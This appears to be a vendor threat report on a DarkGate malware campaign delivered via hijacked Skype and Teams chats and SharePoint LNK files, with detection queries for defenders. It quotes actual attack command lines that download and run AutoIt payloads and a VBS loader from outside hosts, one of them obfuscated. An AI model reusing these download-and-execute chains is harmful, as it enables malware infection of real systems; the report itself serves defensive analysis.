Cyber Threats

We detail an ongoing campaign abusing messaging platforms Skype and Teams to distribute
the DarkGate malware to targeted organizations. We also discovered that once DarkGate is
installed on the victim’s system, additional payloads were introduced to the environment.

From July to September, we observed the DarkGate campaign (detected by Trend Micro as
TrojanSpy.AutoIt.DARKGATE.AA) abusing instant messaging platforms  to deliver a VBA
loader script to victims. This script downloaded and executed a second-stage payload
consisting of a AutoIT scripting containing the DarkGate malware code. It’s unclear how the
originating accounts of the instant messaging applications were compromised, however is
hypothesized to be either through leaked credentials available through underground forums
or the previous compromise of the parent organization.

DarkGate has not been very active in the past couple of years. However, this year we have
observed multiple campaign deployments, as reported by Truesec and MalwareBytes. Upon
closely monitoring this campaign, we observed that most of DarkGate attacks were detected
in the Americas region, followed closely by those in Asia, the Middle East, and Africa.

Background

DarkGate is classified as a commodity loader that was first documented in late 2017.
Versions of DarkGate have been advertised on Russian language forum eCrime since May
2023. Since then, an increase in the number of initial entry attacks using the malware has
been observed.

DarkGate has various features, including the ability to perform the following actions:

Execute discovery commands (including directory traversal)
Self-update and self-manage
Implement remote access software (such as remote desktop protocol or RDP, hidden
virtual network computing or hVNC, and AnyDesk)
Enable cryptocurrency mining functionality (start, stop, and configure)
Perform keylogging
Steal information from browsers
Privilege escalation

DarkGate also uses a Windows-specific automation and scripting tool called AutoIt to deliver
and execute its malicious capabilities. Despite being a legitimate tool, AutoIt has been
frequently abused by other malware families for defense evasion and an added obfuscation

layer. Historically, however, none of the notable loaders like IcedID, Emotet, or Qakbot have
been observed to abuse it,making it easier for researchers or security teams to link the
activity to the malware campaign.

Comparing this latest variant of DarkGate with a sample also abusing AutoIt in 2018, we
observed that the routine appears to have changed slightly in terms of the initial stager and
the addition of obfuscation to its command lines. The infection chain, however, largely
remains the same.

Attack overview

From this sample we studied, the threat actor abused a trusted relationship between the two
organizations to deceive the recipient into executing the attached VBA script. Access to the
victim’s Skype account allowed the actor to hijack an existing messaging thread and craft the
naming convention of the files to relate to the context of the chat history.

The victims received a message from a compromised Skype account, with the message
containing a deceptive VBS script with a file name following the following format:
<filename.pdf> www.skype[.]vbs. The spacing in the file name tricks the user into believing

the file is a .PDF document while hiding the real format as www.skype[.]vbs. In this sample
we studied, the recipient knew the sender as someone who belonged to a trusted external
supplier.

The VBA script, once executed by the victim, begins by creating a new folder named
“<Random Char >”, then copies the legitimate curl.exe with same name of the directory
created as <Random Char>.exe. The script then downloads the AutoIt3 executable and .AU3
script from an external server hosting the files.

files: a legitimate copy of the AutoIt executable and a maliciously complied .au3 script.

Trend Vision One™ detected the loading of the VBA script via its execution using the
Windows native wscript.exe. The script created the <Random Char> directory and copied
curl.exe to <Random Char>.exe.

Looking at Trend Vision One’s RCA, we can observe that the curl command was used to
retrieve the legitimate AutoIt application and the associated malicious fIKXNA.au3 (.au3
representing a AutoIt Version 3 script file). Curl was executed via cmd.exe with the following
parameters to retrieve two files from the remote hosting server:

C:\Windows\System32\cmd.exe" /c mkdir c:\zohn & cd /d c:\zohn & copy
C:\windows\system32\curl.exe zohn.exe & zohn -o Autoit3.exe
hxxp://reactervnamnat[.]com:80 & zohn -o BzpXNT.au3
hxxp://reactervnamnat[.]com:80/msimqrqcjpz & Autoit3.exe BzpXNT.au3

In another sample, the threat was observed sending a link via a Microsoft Teams message.
In this case, the organization’s system allowed the victim to receive messages from external
users, which resulted in them becoming a potential target of spam. Researchers from
Truesec documented a similar DarkGate technique in early September. While the Skype
routine masqueraded the VBS file as a PDF document, in the Teams version of compromise,
the attackers concealed a .LNK file instead. Moreover, the sample that abused Teams came
from an unknown, external sender.

We also observed a tertiary delivery method of the VBA script wherein a .LNK file arrives in a
compressed file from the originators’ SharePoint site. The victim is lured to navigate the
SharePoint site given and download the file named “Significant company changes
September.zip”.

The .ZIP file contains the following .LNK files posing as a PDF document:

Company_Transformations.pdf.lnk
Revamped_Organizational_Structure.pdf.lnk

6/12



Position_Guidelines.pdf.lnk
Fresh_Mission_and_Core_Values.pdf.lnk
Employees_Affected_by_Transition.pdf.lnk

Using conditional execution, the accompanying command will only execute if the previous
command fails. The LNK file contains the following command:

"C:\Windows\System32\cmd.exe" /c hm3 || EChO hm3 & PIN"G" hm3 || cURl
h"t"t"p":"//"1"85.39".1"8".17"0"/m"/d"2"J" -o C:\Users\
<USER>\AppData\Local\Temp\hm3.vbs & PIN"G" -n 4 hm3 || c"sCR"i"Pt" C:\Users\
<USER>\AppData\Local\Temp\hm3.vbs & e"XI"t 'HlnLEG=OcCQmmcm

Once successful, a loaderVBA script is downloaded and executed (hm3.vbs). The VBA script
will proceed to copy and rename curl.exe from the System32 directory as “<Random
Char>.exe”, and the curl command will be used to retrieve Autoit3.exe and the associated
malicious DarkGate code.

DarkGate AU3 script

The downloaded artifacts contained both legitimate copy of AutoIt and a maliciously
compiled AutoIt script file that contained the malicious capabilities of DarkGate. The AU3 file
first performs the following checks before loading the script. If any of the following conditions
 are not met, the script is terminated:

When the existence of %Program Files% is confirmed

7/12



When the username scanned is not “SYSTEM”

Once the environmental checks are complete, the program searches for a file with the ".au3"
extension to decrypt and execute the DarkGate payload. If the .AU3 file cannot be loaded,
the program displays an error message box and terminates the execution.

After successfully executing the .AU3 file, the file spawns surrogate processes located in
C:\Program Files (x86)\. These processes include iexplore.exe, GoogleUpdateBroker.exe,
and Dell.D3.WinSvc.UILauncher.exe. These are injected with shellcode to execute the
DarkGate payload in memory.

The malware achieves persistence by dropping a randomly named LNK file to the Windows
User Startup folder, enabling automatic execution of the file at every system startup,
following this path

<C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
<random>.lnk>

In addition the execution creates a folder on the host within the Program Data directory using
a randomly generated seven-character string to store log and configuration data. To help aid
in the investigation of the DarkGate payload and processes, a tool by Telekom Security can
be used to dump the config file.

Post-installation activities

The threat was observed acting as a downloader of additional payloads. Post-installation of
the DarkGate malware, it dropped files in the  <C:/Intel/> and <%appdata%/Adobe/>
directories, which helps in its attempt to masquerade itself.

The dropped files were detected as variants of either DarkGate or Remcos, potentially as a
means to strengthen the attackers’ foothold in the infected system. Here are some of the
sample file names we found for these additional payloads:

Folkevognsrugbrd.exe
logbackup_0.exe
sdvbs.exe
Vaabenstyringssystem.exe
Sdvaners.exe
Dropper.exe

Conclusion and recommendations

In this case study, the attack was detected and contained before the actor could achieve
their objectives. However, we’ve noted that given the attacker's previous pivot to advertising
and leasing DarkGate, the objectives of the attacker might vary, depending on the affiliates
involved. Cybercriminals can use these payloads to infect systems with various types of
malware, including info stealers, ransomware, malicious and/or abused remote management
tools, and cryptocurrency miners.

In the main case discussed, the Skype application was legitimately used to communicate
with third-party suppliers,making it easier to penetrate and/or lure the users in accessing the
malicious file. The recipient was just the initial target to gain a foothold in the environment.
The goal is still to penetrate the whole environment, and depending on the threat group that

bought or leased the DarkGate variant used, the threats can vary from ransomware to
cryptomining. From our telemetry, we have seen DarkGate leading to tooling being detected
commonly associated with the Black Basta ransomware group.

 
As long as external messaging is allowed, or abuse of trusted relationships via compromised
accounts is unchecked, then this technique for initial entry can be done to and with any
instant messaging (IM) apps. The introduction of any new application to an organization
should be accompanied by measures for securing and limiting that organization’s attack
surface. In this case, IM applications should be controlled by the organization to enforce
rules such as blocking external domains, controlling attachments, and, if possible,
implementing scanning. Multifactor authentication (MFA) is highly recommended to secure
applications (including IM ones) in case of valid credentials’ compromise. This limits the
potential proliferation of threats using these means.

Application allowlisting is a good defense mechanism to deploy to hosts through policies and
ensures that end users can only access and execute certain applications. In this instance,
the AutoIt application is rarely required to be resident or run on end-user machines.

Although the arrival vector of the threat is nothing new, it shows that cybersecurity should
start as left of attacks and infection routines as possible. Regardless of rank, organizations
should regularly conduct and implement informative methods to continuously raise user
security awareness among employees during training.  More importantly, the aim is to
empower people to recognize and protect themselves against the latest threats. Hijacked
threads, either via email or instant message, rely on the recipient believing that the sender is
who they say they are and therefore can be trusted.  Empowering users to question this trust
and to remain vigilant can therefore be an important factor in raising security awareness and
confidence.

This case highlights the importance of in-depth, 24/7 monitoring, defense, and detection via
Trend Micro™ Managed XDR, included in Trend Service One™,as the responsiveness of our
security analysts to detect and contain threats from progressing to high severity compromise
plays an important role in shifting tactics, techniques, and procedures (TTPs). Organizations
should also consider Trend Vision One™, which offers the ability to detect and respond to
threats across multiple security layers. It can isolate endpoints, often the source of infection,
until they are fully cleaned, or until the investigation is done.the investigation is done.

For Trend Vision One customers, here are some of the Vision One search queries for
DarkGate:

processFilePath:wscript.exe AND objectFilePath:cmd.exe AND objectCmd:(au3 OR
autoit3.exe OR curl) AND eventSubId: 2

11/12



"cmd.exe" spawns "curl.exe", which will retrieve the legitimate AutoIt application and the
associated malicious .au3 (.au3 representing a AutoIt Version 3 script file). From the query
eventSubId: “2” indicates TELEMETRY_PROCESS_CREATE

 
parentFilePath:cmd.exe AND processFilePath:curl.exe AND processCmd:*http* AND
objectFilePath:*vbs AND eventSubId:101

Check for any VBScript download via curl. From the query, “eventSubId: 101” indicates
TELEMETRY_FILE_CREATE
